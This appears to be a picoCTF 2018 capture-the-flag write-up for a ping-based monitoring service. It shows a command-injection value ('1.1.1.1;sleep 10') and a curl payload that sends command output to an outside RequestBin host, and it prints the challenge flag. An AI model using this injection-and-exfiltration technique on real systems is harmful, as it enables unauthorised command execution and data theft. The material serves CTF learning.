fancy-alive-monitoring
======================

Points: 400  
Solves: 480

Flag: `picoCTF{n3v3r_trust_a_b0x_d7ad162d}`


Description
-----------

One of my school mate developed an alive monitoring tool. Can you get a flag
from http://2018shell2.picoctf.com:17593 (link)?


Solution
--------

This service is monitoring some hosts with the result of the `ping` comand (see
[index.txt](index.txt)). This service has a client-side filtering, using
JavaScript, and a server-side filtering. The server-side filter has been
malformed and verify that the IP address begin by a real IP, but does not verify
that it's just an IP. So we are able to combine the `ping` command with another
commend.

To verify this hypothesis, we can send the string `1.1.1.1;sleep 10` as an IP.
If the page takes more than 10 seconds to be generated, we have trigger the
vulnerability. ![](hypothesis_10sec.png)

So, tiiiiiiiime to exfiltrate ! The `curl` command is present on this machine,
so we are able to exfiltrate data with it and
[RequestBin.net](http://requestbin.net/). The payload ``1.1.1.1;curl -X POST -d
"`<YOUR COMMAND>`" http://requestbin.net/r/<YOUR URL ID>``.

By executing the `ls` command, we see the presence of a file
`the-secret-1335-flag.txt`. It contains the flag.
